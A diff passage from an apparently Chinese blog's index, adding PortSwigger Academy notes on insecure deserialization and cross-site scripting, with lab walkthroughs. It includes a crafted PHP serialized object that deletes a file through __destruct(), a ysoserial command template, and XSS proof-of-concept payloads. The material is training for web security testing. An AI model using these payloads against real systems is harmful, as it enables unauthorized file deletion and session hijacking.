+<p>开发人员可以在类中添加魔法方法，以便预先确定在相应事件或场景发生时应执行哪些代码。调用魔法方法的具体时间和原因因方法而异。PHP 中最常见的例子之一是 <code>__construct()</code>，它在类的对象实例化时被调用，类似于 Python 的 <code>__init__</code> 。通常，构造函数魔法方法包含初始化实例属性的代码。不过，开发人员可以自定义魔法方法，以执行他们想要的任何代码。</p>
+<p>魔法方法被广泛使用，其本身并不代表漏洞。但是，当执行这些方法的代码处理攻击者可控制的数据（例如来自反序列化对象的数据）时，它们就会变得危险。攻击者可以利用这一点，在满足相应条件时自动调用反序列化数据上的方法。</p>
+<p>最重要的是，有些语言在反序列化过程中会自动调用魔法方法。例如，PHP 的 <code>unserialize()</code> 方法会查找并调用对象的 <code>__wakeup()</code> 魔法方法。</p>
+<p>在 Java 反序列化中，<code>ObjectInputStream.readObject()</code> 方法也是如此，该方法用于从初始字节流中读取数据，本质上类似于 “重新初始化 ”序列化对象的构造函数。不过，可序列化类也可以按如下方式声明自己的 <code>readObject()</code> 方法：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// implementation</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>以这种方式声明的 <code>readObject()</code> 方法就像一个魔法方法，在反序列化过程中会被调用。这样，类就能更紧密地控制自己字段的反序列化。</p>
+<p>你应该密切关注任何包含这类神奇方法的类。它们允许你在对象完全反序列化之前将数据从序列化对象传递到网站代码中。这是创建更高级漏洞的起点。</p>
+<h2 id="注入任意对象">注入任意对象</h2>
+<p>正如我们所见，偶尔可以通过简单编辑网站提供的对象来利用不安全的反序列化。然而，注入任意对象类型会带来更多可能性。</p>
+<p>在面向对象编程中，对象可用的方法由其类决定。因此，如果攻击者能操纵作为序列化数据传入的对象类别，就能影响反序列化后甚至反序列化过程中执行的代码。</p>
+<p>反序列化方法通常不会检查它们正在反序列化的对象。这意味着你可以传入网站可用的任何可序列化类的对象，而该对象将被反序列化。这实际上允许攻击者创建任意类的实例。这个对象不是预期的类并不重要。意外的对象类型可能会导致应用程序逻辑出现异常，但恶意对象届时已经实例化了。</p>
+<p>如果攻击者可以访问源代码，他们就可以详细研究所有可用的类。要构建一个简单的漏洞，攻击者可以查找包含反序列化魔法方法的类，然后检查其中是否有对可控数据执行危险操作的类。然后，攻击者就可以传入该类的序列化对象，使用其魔法方法进行攻击。</p>
+<h4 id="Lab：-PHP-中的任意对象注入">Lab： PHP 中的任意对象注入</h4>
+<p>本实验使用基于序列化的会话机制，因此容易受到任意对象注入的攻击。要解决该实验问题，请创建并注入一个恶意序列化对象，以删除 Carlos home 目录中的 morale.txt 文件。您需要获得源代码访问权限才能解决本实验。</p>
+<ol>
+<li class="lvl-3">
+<p>登录自己的账户，注意会话 cookie 包含一个序列化的 PHP 对象。</p>
+</li>
+<li class="lvl-3">
+<p>在网站地图中，注意到网站引用了 <code>/libs/CustomTemplate.php</code> 文件。右键单击该文件，选择 “发送到中继器”。</p>
+</li>
+</ol>
+<p><img src="/posts/bea7d250//image-20250527163121200.png" alt="image-20250527163121200"></p>
+<ol start="3">
+<li class="lvl-3">
+<p>在 Burp Repeater 中，注意在请求行的文件名后添加一个斜杠 (<code>~</code>) 就能读取源代码。</p>
+</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CustomTemplate</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$template_file_path</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$lock_file_path</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$template_file_path</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;template_file_path = <span class="variable">$template_file_path</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;lock_file_path = <span class="variable">$template_file_path</span> . <span class="string">&quot;.lock&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">isTemplateLocked</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;lock_file_path);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getTemplate</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;template_file_path);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">saveTemplate</span>(<span class="params"><span class="variable">$template</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">isTemplateLocked</span>()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;lock_file_path, <span class="string">&quot;&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Could not write to &quot;</span> . <span class="variable language_">$this</span>-&gt;lock_file_path);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;template_file_path, <span class="variable">$template</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Could not write to &quot;</span> . <span class="variable language_">$this</span>-&gt;template_file_path);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// Carlos thought this would be a good idea</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;lock_file_path)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;lock_file_path);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ol start="4">
+<li class="lvl-3">
+<p>在源代码中，请注意 <code>CustomTemplate</code> 类包含 <code>__destruct()</code> 魔法方法。这将调用 <code>lock_file_path</code> 属性上的 <code>unlink()</code> 方法，从而删除该路径上的文件。</p>
+</li>
+<li class="lvl-3">
+<p>在 Burp 解码器中，使用序列化 PHP 数据的正确语法创建一个 <code>CustomTemplate</code> 对象，并将 <code>lock_file_path</code> 属性设置为 <code>/home/carlos/morale.txt</code>。确保使用正确的数据类型标签和长度指示符。最终对象应如下所示：</p>
+</li>
+</ol>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">14</span>:<span class="string">&quot;CustomTemplate&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;lock_file_path&quot;</span>;s:<span class="number">23</span>:<span class="string">&quot;/home/carlos/morale.txt&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+<ol start="6">
+<li class="lvl-3">
+<p>对该对象进行 Base64 和 URL 编码，并将其保存到剪贴板。</p>
+</li>
+<li class="lvl-3">
+<p>向 Burp Repeater 发送包含会话 cookie 的请求。</p>
+</li>
+<li class="lvl-3">
+<p>在 Burp Repeater 中，用剪贴板中修改后的 cookie 替换会话 cookie。</p>
+</li>
+<li class="lvl-3">
+<p>发送请求。魔法方法 <code>__destruct()</code> 会被自动调用，并删除 Carlos 的文件。</p>
+</li>
+</ol>
+<p>包含这些反序列化魔法方法的类还可用于发起更复杂的攻击，其中涉及一长串方法调用，即所谓的 “小工具链”。</p>
+<h2 id="小工具链">小工具链</h2>
+<p>小工具 &quot;是应用程序中存在的代码片段，可帮助攻击者实现特定目标。单个小工具可能不会直接对用户输入进行任何有害操作。但是，攻击者的目标可能只是调用一个方法，将用户输入传递到另一个小工具中。通过以这种方式将多个小工具串联在一起，攻击者就有可能将其输入传递到一个危险的 “下沉小工具 ”中，从而造成最大的破坏。</p>
+<p>重要的是要明白，与其他一些类型的漏洞利用不同，小工具链不是攻击者构建的链式方法的有效payload。所有代码都已存在于网站上。攻击者唯一能控制的是传入小工具链的数据。这通常是通过在反序列化过程中调用的魔法方法来实现的，有时也称为 “启动小工具”。</p>
+<p>在外网，许多不安全的反序列化漏洞只能通过使用小工具链来利用。这有时可能是简单的一步或两步链，但构建高严重性攻击可能需要更复杂的对象实例化和方法调用序列。因此，能够构建小工具链是成功利用不安全反序列化的关键因素之一。</p>
+<h3 id="使用预制小工具链">使用预制小工具链</h3>
+<p>手动识别小工具链可能是一个相当艰巨的过程，而且在没有源代码访问权限的情况下几乎是不可能的。幸运的是，有几种使用预建小工具链的方法可以先试试。</p>
+<p>有几种工具可以提供一系列预先发现的链，这些链已在其他网站上被成功利用。即使您没有访问源代码的权限，也可以使用这些工具来识别和利用不安全的反序列化漏洞，所需的工作量相对较小。之所以能采用这种方法，是因为广泛使用了包含可利用小工具链的库。例如，如果 Java 的 Apache Commons Collections 库中的小工具链可以在一个网站上被利用，那么任何其他实现该库的网站也可以使用相同的小工具链进行利用。</p>
+<h4 id="ysoserial">ysoserial</h4>
+<p>ysoserial &quot;就是这样一个 Java 反序列化工具。它可以让你从提供的小工具链中选择一个你认为目标应用程序正在使用的库，然后传入你想执行的命令。然后，它会根据所选链创建一个合适的序列化对象。这仍然需要一定的尝试和错误，但比手动构建自己的小工具链要省力得多。</p>
+<blockquote>
+<p><strong>Note</strong><br>
+在 Java 16 及以上版本中，您需要设置一系列命令行参数，以便 Java 运行 ysoserial。例如</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-all.jar \</span><br><span class="line">   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \</span><br><span class="line">   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \</span><br><span class="line">   --add-opens=java.base/java.net=ALL-UNNAMED \</span><br><span class="line">   --add-opens=java.base/java.util=ALL-UNNAMED \</span><br><span class="line">   [payload] <span class="string">&#x27;[command]&#x27;</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<h4 id="Lab：使用Apache-Commons利用Java-反序列化">Lab：使用Apache Commons利用Java 反序列化</h4>
+<p>本实验室使用基于序列化的会话机制，并加载 Apache Commons Collections 库。虽然您没有源代码访问权限，但仍可使用预构建的小工具链来利用本实验室。</p>
+<p>要解决该实验室问题，请使用第三方工具生成一个包含远程代码执行有效载荷的恶意序列化对象。然后，将此对象传入网站，删除卡洛斯主目录中的 <code>morale.txt</code> 文件。</p>
+<p>本文参考：</p>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
+      <categories>
+        <category>渗透测试</category>
+        <category>反序列化</category>
+      </categories>
+      <tags>
+        <tag>靶场</tag>
+        <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>【渗透总结】路径遍历与文件上传</title>
     <url>/posts/3cec027e/</url>
     <content><![CDATA[<h2 id="目录遍历">目录遍历</h2>
@@ -4978,6 +5320,194 @@ jpg上传成功，php上传失败，随便后缀上传成功，因此后端黑�
       </tags>
   </entry>
   <entry>
+    <title>【PortSwigger学院】跨站脚本（XSS）</title>
+    <url>/posts/cded1aa8/</url>
+    <content><![CDATA[<h2 id="跨站脚本">跨站脚本</h2>
+<h2 id="什么是跨站脚本-XSS-？">什么是跨站脚本 (XSS)？</h2>
+<p>跨站脚本攻击（又称 XSS）是一种网络安全漏洞，它允许攻击者破坏用户与有漏洞的应用程序之间的交互。它允许攻击者规避同源策略，该策略旨在将不同网站相互隔离。跨站脚本漏洞通常允许攻击者伪装成受害用户，执行用户能够执行的任何操作，并访问用户的任何数据。如果受害用户在应用程序中拥有特权访问权限，那么攻击者就可以完全控制应用程序的所有功能和数据。</p>
+<h2 id="XSS-如何工作？">XSS 如何工作？</h2>
+<p>跨站脚本攻击的原理是操纵有漏洞的网站，使其向用户返回恶意 JavaScript。当恶意代码在受害者的浏览器中执行时，攻击者就能完全破坏他们与应用程序的交互。</p>
+<blockquote>
+<p><strong>Labs</strong></p>
+<p>如果您已经熟悉了 XSS 漏洞背后的基本概念，只是想在一些现实的、故意易受攻击的目标上练习利用这些漏洞，您可以通过下面的链接访问本主题中的所有实验室。</p>
+<ul class="lvl-1">
+<li class="lvl-2">
+<p><a href="https://portswigger.net/web-security/all-labs#cross-site-scripting">View all XSS labs</a></p>
+</li>
+</ul>
+</blockquote>
+<h2 id="XSS-概念验证">XSS 概念验证</h2>
+<p>您可以通过注入有效负载，使自己的浏览器执行一些任意 JavaScript 来确认大多数类型的 XSS 漏洞。使用 alert() 函数来实现这一目的早已成为惯例，因为它简短、无害，而且成功调用时很难被忽略。事实上，我们的大多数 XSS 实验都是在模拟受害者的浏览器中调用 alert() 来解决的。</p>
+<p>不幸的是，如果您使用的是 Chrome 浏览器，就会遇到一点小麻烦。从版本 92 开始（2021 年 7 月 20 日），跨源 iframe 无法调用 alert()。由于这些框架用于构建一些更高级的 XSS 攻击，因此有时需要使用其他 PoC 有效负载。在这种情况下，我们推荐使用 print() 函数。如果您有兴趣了解有关这一变更的更多信息，以及我们为什么喜欢 print()，请查看我们有关这一主题的<a href="https://portswigger.net/research/alert-is-dead-long-live-print">博客</a>。</p>
+<h2 id="XSS-攻击有哪些类型？">XSS 攻击有哪些类型？</h2>
+<p>XSS 攻击主要有三种类型。它们是：</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>反射 XSS：恶意脚本来自当前 HTTP 请求。</p>
+</li>
+<li class="lvl-2">
+<p>存储型 XSS：恶意脚本来自网站数据库。</p>
+</li>
+<li class="lvl-2">
+<p>基于 DOM 的 XSS，即漏洞存在于客户端代码而非服务器端代码中</p>
+</li>
+</ul>
+<h2 id="反射式跨站脚本">反射式跨站脚本</h2>
+<p>在本节中，我们将解释反射式跨站脚本，描述反射式 XSS 攻击的影响，并说明如何查找反射式 XSS 漏洞。</p>
+<h3 id="什么是反射式跨站脚本？">什么是反射式跨站脚本？</h3>
+<p>反射式 XSS 是跨站脚本攻击中最简单的一种。当应用程序接收 HTTP 请求中的数据，并以不安全的方式将这些数据包含在即时响应中时，就会出现这种情况。</p>
+<p>下面是一个反射 XSS 漏洞的简单示例：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">https://insecure-website.com/status?message=All+is+well.</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Status: All is well.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>应用程序不会对数据进行任何其他处理，因此攻击者可以构建类似的攻击：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">https://insecure-website.com/status?message=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="comment">/*+Bad+stuff+here...+*/</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Status: <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="comment">/* Bad stuff here... */</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>如果用户访问了攻击者构建的 URL，那么攻击者的脚本就会在该用户与应用程序的会话上下文中，在用户的浏览器中执行。此时，脚本可以执行任何操作，并检索用户可以访问的任何数据。</p>
+<p>当应用程序接收 HTTP 请求中的数据，并以不安全的方式将该数据包含在即时响应中时，就会产生反射式跨站脚本攻击（或 XSS）。</p>
+<p>假设一个网站有一个搜索功能，它在 URL 参数中接收用户提供的搜索词：</p>
+<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">https:</span><span class="comment">//insecure-website.com/search?term=gift</span></span><br></pre></td></tr></table></figure>
+<p>应用程序会在对该 URL 的响应中呼应所提供的搜索词：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>You searched for: gift<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>假定应用程序不对数据进行任何其他处理，攻击者就可以构建这样的攻击：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">https://insecure-website.com/search?term=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="comment">/*+Bad+stuff+here...+*/</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>该 URL 会得到以下响应：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>You searched for: <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="comment">/* Bad stuff here... */</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>如果应用程序的其他用户请求攻击者的 URL，那么攻击者提供的脚本就会在受害者用户的浏览器中，在其与应用程序的会话上下文中执行。</p>
+<h3 id="Lab-将-XSS-反映到未编码的-HTML-上下文中">Lab: 将 XSS 反映到未编码的 HTML 上下文中</h3>
+<p>直接在搜索框搜索 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 就通关了</p>
+<h3 id="反射式-XSS-攻击的影响">反射式 XSS 攻击的影响</h3>
+<p>如果攻击者可以控制受害者浏览器中执行的脚本，那么他们通常就可以完全控制该用户。其中，攻击者可以：</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>在应用程序内执行用户可以执行的任何操作。</p>
+</li>
+<li class="lvl-2">
+<p>查看用户可以查看的任何信息。</p>
+</li>
+<li class="lvl-2">
+<p>修改用户可以修改的任何信息。</p>
+</li>
+<li class="lvl-2">
+<p>启动与其他应用程序用户的交互，包括恶意攻击，这些攻击看似来自最初的受害用户。</p>
+</li>
+</ul>
+<p>攻击者可以通过各种手段诱使受害用户发出受其控制的请求，从而实施反射 XSS 攻击。这些手段包括在攻击者控制的网站上或允许生成内容的其他网站上放置链接，或在电子邮件、推特或其他信息中发送链接。攻击可以直接针对已知用户，也可以是针对应用程序任何用户的无差别攻击。</p>
+<p>攻击需要外部传递机制，这意味着反射 XSS 的影响通常不如存储 XSS 严重，因为存储 XSS 可以在易受攻击的应用程序内部传递自带的攻击。</p>
+<h3 id="利用跨站点脚本漏洞">利用跨站点脚本漏洞</h3>
+<p>证明发现跨站脚本漏洞的传统方法是使用 alert() 函数创建一个弹出窗口。这并不是因为 XSS 与弹出窗口有什么关系；这只是一种证明您可以在给定域上执行任意 JavaScript 的方法。您可能会注意到有些人使用 alert(document.domain)。这是一种明确说明 JavaScript 在哪个域上执行的方法。</p>
+<p>有时，你会想更进一步，通过提供一个完整的漏洞利用来证明 XSS 漏洞是一个真正的威胁。在本节中，我们将探讨三种最常用、最强大的 XSS 漏洞利用方法。</p>
+<h4 id="利用跨站脚本窃取-cookie">利用跨站脚本窃取 cookie</h4>
+<p>窃取 cookie 是一种利用 XSS 的传统方法。大多数网络应用程序都使用 cookie 进行会话处理。您可以利用跨站脚本漏洞，将受害者的 cookie 发送到自己的域，然后手动将 cookie 注入浏览器并假冒受害者。</p>
+<p>实际上，这种方法有很大的局限性：</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>受害者可能没有登录。</p>
+</li>
+<li class="lvl-2">
+<p>许多应用程序会使用 HttpOnly 标志对 JavaScript 隐藏 cookie。</p>
+</li>
+<li class="lvl-2">
+<p>会话可能被其他因素锁定，如用户的 IP 地址。</p>
+</li>
+<li class="lvl-2">
+<p>会话可能会在你劫持之前超时。</p>
+</li>
+</ul>
+<h4 id="Lab：-利用跨站脚本窃取-cookie">Lab： 利用跨站脚本窃取 cookie</h4>
+<p>本实验室包含博客评论功能中的存储 XSS 漏洞。模拟受害者用户会查看发布后的所有评论。要解决该实验问题，利用该漏洞渗出受害者的会话 cookie，然后使用该 cookie 冒充受害者。</p>
+<h3 id="不同情况下的反射-XSS">不同情况下的反射 XSS</h3>
+<h2 id="存储型XSS">存储型XSS</h2>
+<p>当应用程序从不受信任的来源接收数据，并以不安全的方式将这些数据包含在随后的 HTTP 响应中时，就会产生存储 XSS（也称为持久或二阶 XSS）。</p>
+<p>有关数据可能是通过 HTTP 请求提交给应用程序的；例如，博客文章上的评论、聊天室中的用户昵称或客户订单上的详细联系信息。在其他情况下，数据可能来自其他不受信任的来源；例如，显示通过 SMTP 收到的邮件的网络邮件应用程序、显示社交媒体帖子的营销应用程序或显示网络流量数据包的网络监控应用程序。</p>
+<p>下面是一个存储 XSS 漏洞的简单示例。一个留言板应用程序允许用户提交信息，并显示给其他用户：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Hello, this is my message!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>应用程序不会对数据进行任何其他处理，因此攻击者可以轻松发送攻击其他用户的信息：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="comment">/* Bad stuff here... */</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="基于-DOM-的跨站点脚本">基于 DOM 的跨站点脚本</h2>
+<p>基于 DOM 的 XSS（也称 DOM XSS）是指应用程序包含一些客户端 JavaScript，这些 JavaScript 以不安全的方式处理来自不信任源的数据，通常是将数据写回 DOM。</p>
+<p>在下面的示例中，应用程序使用 JavaScript 从输入字段读取值，并将该值写入 HTML 中的一个元素：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> search = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;search&#x27;</span>).<span class="property">value</span>;</span><br><span class="line"><span class="keyword">var</span> results = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;results&#x27;</span>);</span><br><span class="line">results.<span class="property">innerHTML</span> = <span class="string">&#x27;You searched for: &#x27;</span> + search;</span><br></pre></td></tr></table></figure>
+<p>如果攻击者可以控制输入字段的值，他们就可以轻松构建一个恶意值，从而执行自己的脚本：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">You</span> searched <span class="attr">for</span>: <span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">&#x27;/* Bad stuff here... */&#x27;</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+<p>在典型的情况下，输入字段将由 HTTP 请求的一部分填充，如 URL 查询字符串参数，从而允许攻击者使用恶意 URL 进行攻击，其方式与反射 XSS 相同。</p>
+<h2 id="XSS-可以用来做什么？">XSS 可以用来做什么？</h2>
+<p>利用跨站脚本漏洞的攻击者通常能够：</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>冒充或伪装成受害用户。</p>
+</li>
+<li class="lvl-2">
+<p>执行用户能够执行的任何操作。</p>
+</li>
+<li class="lvl-2">
+<p>读取用户能够访问的任何数据。</p>
+</li>
+<li class="lvl-2">
+<p>获取用户的登录凭证。</p>
+</li>
+<li class="lvl-2">
+<p>对网站进行虚拟篡改。</p>
+</li>
+<li class="lvl-2">
+<p>在网站中注入木马功能。</p>
+</li>
+</ul>
+<h2 id="XSS-漏洞的影响">XSS 漏洞的影响</h2>
+<p>XSS 攻击的实际影响通常取决于应用程序的性质、功能和数据，以及被攻击用户的状态。例如：</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>在小册子软件应用程序中，所有用户都是匿名的，所有信息都是公开的，因此影响通常很小。</p>
+</li>
+<li class="lvl-2">
+<p>在持有敏感数据（如银行交易、电子邮件或医疗记录）的应用程序中，影响通常会很严重。</p>
+</li>
+<li class="lvl-2">
+<p>如果被入侵的用户在应用程序中拥有更高的权限，那么影响通常会非常严重，攻击者可以完全控制存在漏洞的应用程序，并入侵所有用户及其数据。</p>
+</li>
+</ul>
+<h2 id="如何查找和测试-XSS-漏洞">如何查找和测试 XSS 漏洞</h2>
+<p>绝大多数 XSS 漏洞都可以通过 Burp Suite 的网络漏洞扫描仪快速、可靠地发现。</p>
+<p>手动测试反射和存储的 XSS 通常涉及向应用程序中的每个入口点提交一些简单的唯一输入（如一个简短的字母数字字符串），识别在 HTTP 响应中返回所提交输入的每个位置，并对每个位置进行单独测试，以确定适当制作的输入是否可用于执行任意 JavaScript。通过这种方法，您可以确定发生 XSS 的上下文，并选择合适的有效载荷加以利用。</p>
+<p>手动测试由 URL 参数引起的基于 DOM 的 XSS 涉及类似的过程：在参数中放置一些简单的唯一输入，使用浏览器的开发工具在 DOM 中搜索该输入，并测试每个位置以确定其是否可被利用。然而，其他类型的 DOM XSS 更难检测。要在非基于 URL 的输入（如 document.cookie）或非基于 HTML 的汇（如 setTimeout）中发现基于 DOM 的漏洞，审查 JavaScript 代码是不可替代的，而审查 JavaScript 代码可能非常耗时。Burp Suite 的网络漏洞扫描器结合了 JavaScript 的静态和动态分析，能够可靠地自动检测基于 DOM 的漏洞。</p>
+<h2 id="内容安全政策">内容安全政策</h2>
+<p>内容安全策略（CSP）是一种浏览器机制，旨在减轻跨站脚本和其他一些漏洞的影响。如果采用 CSP 的应用程序包含类似 XSS 的行为，那么 CSP 可能会阻碍或阻止对漏洞的利用。通常情况下，CSP 可被规避，以便利用底层漏洞。</p>
+<h2 id="悬挂标记注入">悬挂标记注入</h2>
+<p>悬垂标记注入是一种技术，可用于在由于输入过滤器或其他防御措施而无法进行全面跨站脚本攻击的情况下跨域捕获数据。这种技术通常可用于捕获其他用户可见的敏感信息，包括可用于代表用户执行未授权操作的 CSRF 标记。</p>
+<h2 id="如何防止-XSS-攻击">如何防止 XSS 攻击</h2>
+<p>在某些情况下，防止跨站脚本是一件小事，但根据应用程序的复杂程度和处理用户可控数据的方式，防止跨站脚本可能要难得多。</p>
+<p>一般来说，有效防止 XSS 漏洞可能需要结合以下措施：</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>在输入到达时进行过滤。在接收用户输入时，尽可能严格地根据预期或有效输入进行过滤。</p>
+</li>
+<li class="lvl-2">
+<p>对输出数据进行编码。在 HTTP 响应中输出用户可控数据时，要对输出进行编码，防止其被解释为活动内容。根据输出上下文，这可能需要应用 HTML、URL、JavaScript 和 CSS 编码的组合。</p>
+</li>
+<li class="lvl-2">
+<p>使用适当的响应标头。为防止在不打算包含任何 HTML 或 JavaScript 的 HTTP 响应中出现 XSS，可以使用 <code>Content-Type</code> 和 <code>X-Content-Type-Options</code> 标头，确保浏览器按您的意图解释响应。</p>
+</li>
+<li class="lvl-2">
+<p>内容安全策略。作为最后一道防线，你可以使用内容安全策略（CSP）来降低仍然存在的任何 XSS 漏洞的严重性。</p>
+</li>
+</ul>
+<p>对输出数据进行编码。在 HTTP 响应中输出用户可控数据时，要对输出进行编码，防止其被解释为活动内容。根据输出上下文，这可能需要应用 HTML、URL、JavaScript 和 CSS 编码的组合。</p>
+<h2 id="有关跨站脚本的常见问题">有关跨站脚本的常见问题</h2>
+<p>XSS 漏洞有多常见？XSS 漏洞非常常见，XSS 可能是最常出现的网络安全漏洞。</p>
+<p>XSS 攻击有多常见？很难获得有关真实世界中 XSS 攻击的可靠数据，但它被利用的频率可能低于其他漏洞。</p>
+<p>XSS 和 CSRF 有什么区别？XSS 涉及导致网站返回恶意 JavaScript，而 CSRF 涉及诱使受害用户执行他们无意执行的操作。</p>
+<p>XSS 与 SQL 注入有何区别？XSS 是针对其他应用程序用户的客户端漏洞，而 SQL 注入是针对应用程序数据库的服务器端漏洞。</p>
+<p>如何在 PHP 中防止 XSS？使用允许字符的白名单过滤输入，并使用类型提示或类型转换。在 HTML 上下文中使用 <code>htmlentities</code> 和 <code>ENT_QUOTES</code> 对输出进行转义，在 JavaScript 上下文中使用 JavaScript Unicode 转义。</p>
+<p>如何在 Java 中防止 XSS？使用允许字符白名单过滤输入，使用 Google Guava 等库对 HTML 上下文的输出进行 HTML 编码，或使用 JavaScript Unicode 转义对 JavaScript 上下文进行转义。</p>
+<p>本文参考：</p>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
+      <categories>
+        <category>渗透测试</category>
+        <category>XSS</category>
+      </categories>
+      <tags>
+        <tag>PortSwigger靶场</tag>
+        <tag>XSS</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>【PortSwigger学院】路径遍历</title>
     <url>/posts/15b3971d/</url>
